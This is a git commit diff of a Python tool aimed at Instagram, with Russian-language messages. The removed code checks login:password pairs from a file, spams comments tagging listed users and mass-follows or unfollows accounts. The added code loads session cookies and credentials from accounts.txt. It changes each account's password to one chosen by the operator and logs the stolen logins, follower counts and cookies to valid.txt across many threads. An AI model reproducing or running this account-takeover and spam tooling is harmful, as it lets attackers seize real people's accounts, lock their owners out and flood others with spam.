94eb22e801d98301af114ccbdfd8372a0efafd20
Benefix <89061583+Benefixx@users.noreply.github.com>
2022-04-03 20:06:23 +0300

    add
    add

--- main.py
+++ main.py
@@ -1,272 +1,177 @@
-import psutil
-from licensing.methods import Key, Helpers
-from licensing.models import *
-from base64 import b64encode
-from collections import OrderedDict
-from wmi import WMI
 import json
-import wmi
-from configparser import ConfigParser
-from logging import log
-import re
-import shutil
+import threading
+import loguru
 import requests
-from loguru import logger
-from datetime import datetime
 import time
-import fake_useragent
-from requests.api import head
-import argparse
-import sys
-import os
-sys.path.append(os.path.join(sys.path[0], "../"))
-from instabot import Bot  # noqa: E402
-
-print(f"""
-\t\t\t\t\t           _      _____ ________      __
-\t\t\t\t\t     /\   | |    |_   _|  ____\ \    / /
-\t\t\t\t\t    /  \  | |      | | | |__   \ \  / / 
-\t\t\t\t\t   / /\ \ | |      | | |  __|   \ \/ /  
-\t\t\t\t\t  / ____ \| |____ _| |_| |____   \  /   
-\t\t\t\t\t /_/    \_\______|_____|______|   \/     
-\t\t\t\t\t [+] Создатель: Алиев
-""")
-
-file = "config.ini"
-config = ConfigParser()
-config.read(file, encoding="utf-8")
-
-loginCFG = config["settings"]["login"]
-passwordCFG = config["settings"]["password"]
-textspm = config["settings"]["text"]
-linkspm = config["settings"]["link"]
-username_sub = config['settings']['username_subscribe']
-
-chat_id = config["telegram"]["chat_id"]
-BOT_TOKEN = config["telegram"]["bot_token"]
-
-key1 = config['working']['key']
+import random
+from fake_useragent import UserAgent
+from bs4 import BeautifulSoup as BS
+import time
 
 
-parser = argparse.ArgumentParser(add_help=True)
-parser.add_argument("-u", type=str, help=f"{loginCFG}")
-parser.add_argument("-p", type=str, help=f"{passwordCFG}")
-args = parser.parse_args()
+with open("accounts.txt", "r", encoding="utf-8") as file: data = file.read().split("\n")
+with open("settings.json", "r", encoding="utf-8") as file: Settings = json.load(file)
 
-s = requests.Session()
-link = "https://www.instagram.com/accounts/login/"
-login_url = "https://www.instagram.com/accounts/login/ajax/"
-time1 = int(datetime.now().timestamp())
-user = fake_useragent.UserAgent().random
+class Instagram():
+    def __init__(self):
+        self.client = requests.session()
+        self.userag = UserAgent()
 
-vv = open('valid.txt', 'a', encoding='utf=8')
-vv.write('Ищу аккаунты\n')
+    def html(self, html):
+        with open("index.html", "w", encoding="utf-8") as file: file.write(str(html))
 
-
-def auth_script():
-    RSAPubKey = "<RSAKeyValue><Modulus>qh0nzFTXrXDte6pnsM+2UxFPaGBA/ZhEvZaWBL++A9FXouqu4HDtq7v0HsDQit9bvDyLt0k1kRRtfLCmtydAAFAiUEKBYDU+4Xs7ryornBabQ1mgEfIP7Ogv2YSZ/3UJy+fmot52JWzeT2PWqUxmBfjAIaVIu7pxA5/nnLmAdYoA1htXjtk6pnPjkUZAvrtonJnQibHQ0ENKBKusZnyjlQprsgkhpXWn0BUiKJjLcaOAwWDZkdj5ieilzDpmNFZnfSes9jM0jVCKefRv9cBsRXdVT1iqNE59pG4M5Q6r0hxTHRArSpgNjuQmIIH++GV47LtEXKHpRRVsEU4zRNDQ2Q==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>"
-    access = "WyI3MjY0NzUzIiwiK1ZKYTVhOG9RRGtwaWdsU3NsaThEb2Q1K1dkL0llUm5JcjRJRnUwciJd"
-
-    """protection"""
-    for proc in psutil.process_iter():
-        name = proc.name()
-        if name == "HTTPDebuggerUI.exe":
-            # print("Do not try that.")
-            time.sleep(2)
-            # exit(0)
-
-    key = str(key1)
-    result = Key.activate(
-        token=access,
-        rsa_pub_key=RSAPubKey,
-        product_id='13215',
-        key=key1,
-        machine_code=Helpers.GetMachineCode()
-    )
-
-    if result[0] == None or not Helpers.IsOnRightMachine(result[0]):
-        # ошибка и ее причина
-        logger.info(f"Ключ не работает: {result[1]}")
-        logger.info("Купить ключ у @decode_mi")
-        sys.exit()
-    else:
-        # Если ключ правильный:
-        logger.info("Ключ верный!")
-        # тут можно написать то, что будет происходить если ключ верный
-
-
-def get_username():
-    sys.path.append(os.path.join(sys.path[0], "../"))
-    from instabot import Bot  # noqa: E402
-
-    bot = Bot()
-    bot.login(username=args.u, password=args.p)
-    usernames = []
-    id_users = bot.get_user_following('flight_muz')  # Список подписок
-    print(id_users)
-    for id_user in id_users:
-        usernames.append(bot.get_username_from_user_id(id_user))
-    return usernames
-
-
-def follow_user_following(usrname):
-    sys.path.append(os.path.join(sys.path[0], "../"))
-    from instabot import Bot  # noqa: E402
-
-    bot = Bot()
-    bot.login(username=args.u, password=args.p)
-
-    user_following = bot.get_user_following(usrname)  # Список подписок
-
-    for idusr in user_following:
-        bot.follow(idusr)
-
-
-def auth(login, password):
-    payload = {
-        "username": login,
-        "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{time1}:{password}",
-        "queryParams": {},
-        "optIntoOneTap": "false",
-    }
-
-    r = s.get(link)
-    csrf = re.findall(r"csrf_token\":\"(.*?)\"", r.text)[0]
-    r = s.post(
-        login_url,
-        data=payload,
-        headers={
-            "user-agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
-            "x-requested-with": "XMLHttpRequest",
-            "referer": "https://www.instagram.com/accounts/login/",
-            "x-csrftoken": csrf,
-        },
-    )
-    print(r.text)
-
-    if '{"user":false,"authenticated":false' in r.text:
-        logger.error('Невалид')
-    else:
-        logger.success(f'Валидный аккаунт')
-
-
-def parseCRFToken():
-    r = s.get("https://www.instagram.com/")
-
-    crf_token_parse = r.text.split('window._sharedData = {"config":{"csrf_token":"')[
-        1
-    ].split('",')[0]
-
-    return crf_token_parse
-
-
-def comment(link, message_spam):
-    r = s.get(link)
-    time.sleep(1)
-    id_img = r.text.split('"GraphVideo","id":"')[1].split('",')[0]
-    crf_token_parse = r.text.split('window._sharedData = {"config":{"csrf_token":"')[
-        1
-    ].split('",')[0]
-
-    while True:
-        all_users_name = ['mill_mus', 'kurskworkoutslava', 'petruhanchik', 'latyshev_09', 'cristaly.text', '__k4au__', 'ditchevskie', 'imperia_latyshev_sirotina', 'fortune.finally',
-                          'dream_muzz_', 'jungle.day', 'limferia', '78nochey', 'loover.gr', '_infractum', 'ketoo.13', 'sadness.sound', 'podkayfom.myz',
-                          'limma_group', '__alyona__kalugina__', 'majorkahub', '_cars_movie_', 'tatyana_kh08', 'erokhinvova', 'gogaxs', 'polusladkie.gr', 'pushka.mus',
-                          'org.crime.gr.jacksonstreetboys', '_mwrti_', '1stinbastogne', 'brokenskye', 'udovolstvie.ff', 'victorissas_s', '_seveone',
-                          'axyeno.mus', 'pereverzevgrigorii']
-        for users_name in all_users_name:
-            data3213 = {
-                "comment_text": f'{message_spam} + @{users_name}', "replied_to_comment_id": ""}
-            time.sleep(3)
-            s.post(
-                f"https://www.instagram.com/web/comments/{id_img}/add/",
-                data=data3213,
-                headers={
-                    "user-agent": user,
-                    "x-requested-with": "XMLHttpRequest",
-                    "referer": "https://www.instagram.com",
-                    "x-csrftoken": crf_token_parse,
-                },
-            ).json
-            time.sleep(3)
-            logger.debug(id_img)
-            logger.success(crf_token_parse)
-
-
-def parseMyProfile():
-    req = s.get("https://www.instagram.com/").text
-
-    MyNickname = req.split('"username":"')[1].split('"')[0]
-    print(f"Your nickname: {MyNickname}")
-
-    MyProfile = s.get(f'https://www.instagram.com/{MyNickname}/').text
-    followers = MyProfile.split('<meta property="og:description" content="')[
-        1].split('Followers')[0].replace(' ', '')
-    following = MyProfile.split('Followers, ')[1].split(
-        'Following,')[0].replace(' ', '')
-    posts = MyProfile.split('Following, ')[1].split('Posts')[
-        0].replace(' ', '')
-
-    print(
-        f'Публикаций: {posts} | Подписчиков: {followers} | Подписок: {following}')
-    return MyNickname
-
-
-def checker():
-    with open('accounts.txt') as a:
-        accounts = a.readlines()
-    count = len(accounts)
-    logger.success(str(count) + ' Аккаунтов найдено')
-    final_list = []
-    for i in accounts:
-        final_list.append(i.strip())
-    logger.success(final_list)
-
-    for account in final_list:
-
-        login = account.split(':')[0]
-        password = account.split(':')[1]
-        logger.info(f'Проверяю аккаунт: {login}:{password}')
+    def find(self):
         try:
-            time.sleep(2)
-            auth(login, password)
-            parseMyProfile()
-            vv.write(f'{login}:{password}')
+            account = random.choice(data)
 
-        except Exception as ex:
-            logger.debug(ex)
-            logger.error('Невалид')
+            evidence = account.split(":")
+            cookie = account.split("[")[1].replace("]", "")
+
+            username = evidence[0]
+            password = evidence[1]
+
+            return {
+                "cookie" : cookie,
+                "username" : username,
+                "password" : password,
+                "account" : account
+            }
+
+        except: pass
+
+    def convert(self, cookie):
+        try:
+            cookies = cookie.split("}")
+            session = {}
+            try:
+                for cookie in cookies:
+                    name = cookie.split('"name":"')[1].split('"')[0]
+                    value = cookie.split('value":"')[1].split('"')[0]
+                    session[name] = value
+            except IndexError: pass
+
+            return session
+        except: pass
+
+    def profile(self, username):
+        try:
+            r = self.client.get(f"https://www.instagram.com/{username}/")
+            soup = BS(r.text, "lxml")
+
+            envidense = soup.find("meta", {"property" : "og:description"}).get("content")
+
+            followers = envidense.split("подписчиков")[0]
+            following = envidense.split(",")[1].split(" ")[1]
+            posts = envidense.split(",")[2].split(" ")[1]
+
+            return {
+                "followers" : followers,
+                "posts" : posts,
+                "followings" : following
+            }
+        except IndexError:
+            return False
+
+        except:
+            print("Неизвестная ошибка, отпишите кодеру @benefixx")
+
+    def change(self, username, password, new_password):
+        r = self.client.get("https://www.instagram.com/accounts/password/change/")
+        csrf = r.text.split('"csrf_token":"')[1].split('"')[0]
+        print(f"csrf: {csrf}")
+
+        self.client.headers.update({
+            "X-CSRFToken": csrf,
+            "method": "POST",
+            "path": "/accounts/password/change/",
+            "scheme": "https",
+            "accept": "*/*",
+            "referer": "https://www.instagram.com/accounts/password/change/",
+            "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36"
+        })
+
+        time.sleep(random.randint(2, 5))
+        timer = str(time.time() // 1000).split(".")[0]
+
+        data_change = {"enc_old_password": "#PWD_INSTAGRAM_BROWSER:0:1589682409:" + password,
+                            "enc_new_password1": "#PWD_INSTAGRAM_BROWSER:0:1589682409:" + new_password,
+                            "enc_new_password2": "#PWD_INSTAGRAM_BROWSER:0:1589682409:" + new_password}
+
+        r = self.client.post("https://www.instagram.com/accounts/password/change/", data=data_change)
+
+        if '{"status":"ok"}' in r.text:
+            loguru.Logger.success("ok")
+            return True
+
+        elif "logged-in" in r.text:
+            return "retry"
+
+        else: return False
+
+    def launch(self):
+        while True:
+            evidence = self.find()
+            cookies = self.convert(evidence["cookie"])
+            self.client.cookies.update(cookies)
+            self.client.headers.update({
+
+                'authority': 'www.instagram.com',
+                'cache-control': 'max-age=0',
+                'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': '"Windows"',
+                'upgrade-insecure-requests': '1',
+                'user-agent': self.userag.random,
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+                'sec-fetch-site': 'same-origin',
+                'sec-fetch-mode': 'navigate',
+                'sec-fetch-user': '?1',
+                'sec-fetch-dest': 'document',
+                'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
+
+            })
+
+            r = self.client.get("https://instagram.com")
+            time.sleep(random.randint(1, 2))
+
+            base = self.profile(evidence["username"])
 
 
-def unfollowing():
-    while True:
-        bot = Bot()
-        t3 = bot.login(username=args.u, password=args.p)
-        t4 = bot.unfollow_everyone()
+            cookies = cookies
+            username = evidence["username"]
+            password = evidence["password"]
+            followers = base["followers"]
+            posts = base["posts"]
+            following = base["followings"]
 
+            if base == "False":
+                data.remove(evidence["account"])
+
+            check = self.change(username, password, Settings["password"])
+
+            if check == True:
+
+                loguru.logger.success(f"followers: {followers} | following: {following} | posts: {posts}")
+
+                self.client.get("https://i.instagram.com")
+
+                text = f"{username}:{password} | followers: {followers} | following: {following} | posts: {posts} | cookie: {requests.utils.dict_from_cookiejar(self.client.cookies)}\n"
+                data.remove(evidence["account"])
+                with open("valid.txt", "a", encoding="utf-8") as file:
+                    file.write(text)
+
+            elif check == False:
+                print("Невалид")
+                data.remove(evidence["account"])
+
+            elif check == "retry":
+                pass
 
 def main():
-    # print(get_username())
-    try:
-        shutil.rmtree('config')
-    except:
-        pass
-
-    # auth_script() Защита скрипта, при включении этого пункта будет требоваться авторизация в скрипте.
-    work_mode = input('1 - Отписка от всех аккаунтов\n2 - Спам комментариями\n3 - Чекер аккаунтов\n4 - Подписаться на всех людей которые находятся в подписках у человека\nКакую функцию хотите включить: ')
-    if work_mode == '1':
-        unfollowing()
-    elif work_mode == '2':
-        auth(loginCFG, passwordCFG)
-        comment(linkspm, textspm)
-
-    elif work_mode == '3':
-        auth(loginCFG, passwordCFG)
-        checker()
-
-    elif work_mode == '4':
-        follow_user_following(username_sub)
-
+    instagram = Instagram()
+    ThreadChoice = int(input("Потоков: "))
+    for i in range(0, ThreadChoice):
+        threading.Thread(target=instagram.launch).start()
 
 if __name__ == "__main__":
     main()
---
+++ s.py
@@ -0,0 +1,4 @@
+import requests
+
+r = requests.session()
+r.get("https://vk.com")
